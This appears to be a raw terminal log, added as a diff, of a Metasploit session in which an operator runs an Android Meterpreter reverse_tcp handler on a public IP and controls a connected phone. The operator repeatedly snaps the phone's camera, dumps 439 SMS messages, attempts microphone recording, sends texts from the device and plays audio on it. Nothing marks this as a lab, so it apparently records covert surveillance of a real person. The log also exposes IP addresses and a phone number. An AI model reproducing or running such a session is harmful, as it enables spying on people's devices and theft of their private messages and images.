@@ -1,0 +1,401 @@
+root@RatHat:~/django# msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
+set lhost 185.120.221.217
+set lport 4454
+exploit
+
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit! \
+                 ;@'. __*__,."    \|--- \_____________/
+                  '(.,...."/
+
+
+       =[ metasploit v5.0.5-dev                           ]
++ -- --=[ 1854 exploits - 1049 auxiliary - 325 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4454
+lport => 4454
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 185.120.221.217:4454
+[*] Sending stage (70653 bytes) to 83.120.32.171
+[*] Meterpreter session 1 opened (185.120.221.217:4454 -> 83.120.32.171:53618) a
+t 2019-07-18 07:14:26 +0000
+
+meterpreter > geolocate
+[-] android_geolocate: Operation failed: 1
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+[-] Error running command dump_sms: Rex::TimeoutError Operation timed out.
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+[-] Error running command dump_sms: Rex::TimeoutError Operation timed out.
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+[*] Fetching 439 sms messages
+[*] SMS messages saved to: /root/django/users/administrator/dumpsms.txt
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > webcam_snap -i 1 -p /root/django/users/administrator/webcamsnap1.j
+peg
+[*] Starting...
+[-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+meterpreter > webcam_snap -i 1 -p /root/django/users/administrator/webcamsnap1.j
+peg
+[-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thre
+ad
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current sess
+ion
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the sess
+ion
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish s
+ession.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getuid        Get the user that the server is running as
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command       Description
+    -------       -----------
+    screenshot    Grab a screenshot of the interactive desktop
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+
+Android Commands
+================
+
+    Command           Description
+    -------           -----------
+    activity_start    Start an Android activity from a Uri string
+    check_root        Check if device is rooted
+    dump_calllog      Get call log
+    dump_contacts     Get contacts list
+    dump_sms          Get sms messages
+    geolocate         Get current lat-long using geolocation
+    hide_app_icon     Hide the app icon from the launcher
+    interval_collect  Manage interval collection capabilities
+    send_sms          Sends SMS from target session
+    set_audio_mode    Set Ringer Mode
+    sqlite_query      Query a SQLite database from storage
+    wakelock          Enable/Disable Wakelock
+    wlan_geolocate    Get current lat-long using WLAN information
+
+meterpreter > record_mic -h
+Usage: record_mic [options]
+
+Records audio from the default microphone.
+
+OPTIONS:
+
+    -d <opt>  Number of seconds to record (Default: 1)
+    -f <opt>  The wav file path (Default: '/root/django/[randomname].wav')
+    -h        Help Banner
+    -p <opt>  Automatically play the captured audio (Default: 'true')
+
+meterpreter > record_mic -d 20
+[*] Starting...
+[-] Error running command record_mic: Rex::TimeoutError Operation timed out.
+meterpreter > record_mic -d 10
+[*] Starting...
+[-] Error running command record_mic: Rex::TimeoutError Operation timed out.
+meterpreter > send_sms
+[-] You must enter both a destination address -d and the SMS text body -t
+[-] e.g. send_sms -d +351961234567 -t "GREETINGS PROFESSOR FALKEN."
+
+OPTIONS:
+
+    -d <opt>  Destination number
+    -h        Help Banner
+    -r        Wait for delivery report
+    -t <opt>  SMS body text
+
+meterpreter > send_sms -d 09393345990 -t salam Dash
+[+] SMS sent - Transmission successful
+meterpreter > send_sms -d 09393345990 -t "salam Dash"
+[+] SMS sent - Transmission successful
+meterpreter > send_sms -d 09393345990 -t "salam Dash"webcam_snap -i 2 -p /root/d
+jango/users/administrator/webcamsnap2.jpg
+[+] SMS sent - Transmission successful
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > play /root/a.mp3
+[*] Playing /root/a.mp3...
+[*] Done
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+meterpreter > play
+Please specify a path to an audio file
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+
+[*] 83.120.32.171 - Meterpreter session 1 closed.  Reason: Died
+[-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+msf5 exploit(multi/handler) > msfconsole
+set ExitOnSession true
+[-] msfconsole cannot be run inside msfconsole
+set lhost 185.120.221.217
+set lport 4454
+exploit
+msf5 exploit(multi/handler) > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4454
+lport => 4454
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 185.120.221.217:4454
+[*] Sending stage (70653 bytes) to 83.120.32.171
+[*] Meterpreter session 2 opened (185.120.221.217:4454 -> 83.120.32.171:51905) a
+t 2019-07-18 07:28:50 +0000
+[*] Sending stage (70653 bytes) to 83.120.32.171
+[*] Meterpreter session 3 opened (185.120.221.217:4454 -> 83.120.32.171:42323) a
+t 2019-07-18 07:29:02 +0000
+[*] 83.120.32.171 - Meterpreter session 2 closed.  Reason: Died
+
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter >
+meterpreter >
+meterpreter >
+meterpreter >
+meterpreter >
+meterpreter >
+meterpreter >
+meterpreter > ls
+Listing: /data/data/com.metasploit.stage/files
+==============================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  372864  fil   2019-07-18 07:27:00 +0000  wav
+
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter > webcam_snap -i 2 -p /root/django/users/administrator/webcamsnap2.j
+pg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter > webcam_snap -i 1 -p /root/django/users/administrator/webcamsnap1.j
+peg
+[*] Starting...
+[*] Stopped
+[-] webcam_start: Operation failed: 1
+meterpreter > ls
+Listing: /data/data/com.metasploit.stage/files
+==============================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  372864  fil   2019-07-18 07:27:00 +0000  wav
+
+meterpreter > reset
+[-] Unknown command: reset.
+meterpreter > ls
+Listing: /data/data/com.metasploit.stage/files
+==============================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  372864  fil   2019-07-18 07:27:00 +0000  wav
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 83.120.32.171 - Meterpreter session 3 closed.  Reason: User exit
+msf5 exploit(multi/handler) > msfconsole
+set ExitOnSession true
+[-] msfconsole cannot be run inside msfconsole
+set lhost 185.120.221.217
+set lport 4454
+exploit
+msf5 exploit(multi/handler) > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4454
+lport => 4454
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 185.120.221.217:4454
+
